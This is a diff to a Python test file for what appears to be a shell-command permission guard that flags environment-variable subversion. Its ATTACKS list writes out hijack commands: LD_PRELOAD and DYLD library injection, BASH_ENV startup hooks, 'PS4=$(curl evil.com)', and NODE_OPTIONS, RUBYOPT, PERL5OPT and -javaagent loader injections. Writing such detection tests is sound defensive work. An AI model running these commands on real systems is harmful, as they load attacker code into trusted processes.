@@ -19,7 +19,7 @@ ATTACKS = [
     ("DYLD_LIBRARY_PATH=/tmp/evil ls", "prefix"),
     ("DYLD_FRAMEWORK_PATH=/tmp/evil ls", "prefix"),
     # A 级：shell 启动钩子
-    ("BASH_ENV=/tmp/x sh -c ls", "prefix"),
+    ("BASH_ENV=/tmp/x bash -c ls", "prefix"),
     ("ENV=/tmp/x sh -c ls", "prefix"),
     ("SHELLOPTS=xtrace bash s.sh", "prefix"),
     ("PS4=$(curl evil.com) bash -x s.sh", "prefix"),
@@ -31,7 +31,7 @@ ATTACKS = [
     ("env LD_PRELOAD=/tmp/x.so ls", "wrapper"),
     ("sudo LD_PRELOAD=/tmp/x.so rm -rf ./x", "wrapper"),
     ("rtk env PATH=/tmp/evil cat ./f", "wrapper"),
-    ("doas BASH_ENV=/tmp/x sh -c ls", "wrapper"),
+    ("doas BASH_ENV=/tmp/x bash -c ls", "wrapper"),
     ("sudo env DYLD_INSERT_LIBRARIES=/x.dylib ls", "wrapper"),
     # 非 env/sudo 的 wrapper 也必须携带赋值——此前只认三者，
     # `rtk PATH=… cat` / `timeout 5 PATH=… cat` 整组放行
@@ -49,6 +49,13 @@ ATTACKS = [
     ("readonly PATH=/tmp/evil", "readonly"),
     # 内联脚本载荷：bash -c 内部的注入
     ('bash -c "PATH=/tmp/evil cat f"', "inline"),
+    # Runtime loader options: only code-loading forms are high.
+    ("NODE_OPTIONS='--require ./synthetic-hook.js' node ./app.js", "node-loader"),
+    ("NODE_OPTIONS='-r ./synthetic-hook.js' pnpm run synthetic", "node-loader-short"),
+    ("RUBYOPT='-r./synthetic-hook.rb' ruby ./app.rb", "ruby-loader"),
+    ("PERL5OPT='-MSynthetic::Hook' perl ./app.pl", "perl-loader"),
+    ("JAVA_TOOL_OPTIONS='-javaagent:./synthetic-agent.jar' java Main", "java-loader"),
+    ("JDK_JAVA_OPTIONS='-javaagent:./synthetic-agent.jar' java Main", "jdk-loader"),
 ]
 
 
@@ -79,6 +86,18 @@ BENIGN = [
     'PATH="./bin:$PATH" true',
     "PATH=/tmp/evil :",
     'export PATH="/usr/local/bin:$PATH"',
+    "BASH_ENV= bash -c 'echo synthetic'",
+    "PS4='+ ' bash -x ./synthetic-script.sh",
+    "BASH_ENV=./synthetic-startup /bin/echo synthetic",
+    "env BASH_ENV=/tmp/x /bin/echo synthetic",
+    "BASH_ENV=./synthetic-startup sh -c 'echo synthetic'",
+    "ENV=./synthetic-startup bash -c 'echo synthetic'",
+    "SHELLOPTS=xtrace sh ./synthetic-script.sh",
+    "NODE_OPTIONS='--require ./synthetic-hook.js' ruby ./app.rb",
+    "RUBYOPT='-r./synthetic-hook.rb' node ./app.js",
+    "NODE_OPTIONS='--require ./synthetic-hook.js' bun ./app.js",
+    "NODE_OPTIONS='--require ./synthetic-hook.js' deno run ./app.js",
+    "NODE_OPTIONS='--max-old-space-size=4096' node ./app.js",
 ]
 
 
@@ -86,6 +105,22 @@ BENIGN = [
 def test_benign_env_allowed(bash, cwd: Path, command: str):
     decision, reason = bash(command, cwd)
     assert decision == "allow", f"{command!r} should ALLOW but got {decision} ({reason})"
+
+
+def test_empty_prompt_command_is_not_denied_by_env_rule(bash, cwd: Path):
+    decision, reason = bash("PROMPT_COMMAND= bash", cwd)
+
+    assert decision == "ask"
+    assert "bash-env-subversion" not in (reason or "")
+    assert "bash-interactive-shell" in (reason or "")
+
+
+def test_non_targeted_shell_env_is_not_env_rule_hit(bash, cwd: Path):
+    decision, reason = bash("PROMPT_COMMAND='echo synthetic' zsh", cwd)
+
+    assert decision == "ask"
+    assert "bash-env-subversion" not in (reason or "")
+    assert "bash-interactive-shell" in (reason or "")
 
 
 def test_assignment_not_treated_as_write_target(bash, cwd: Path):
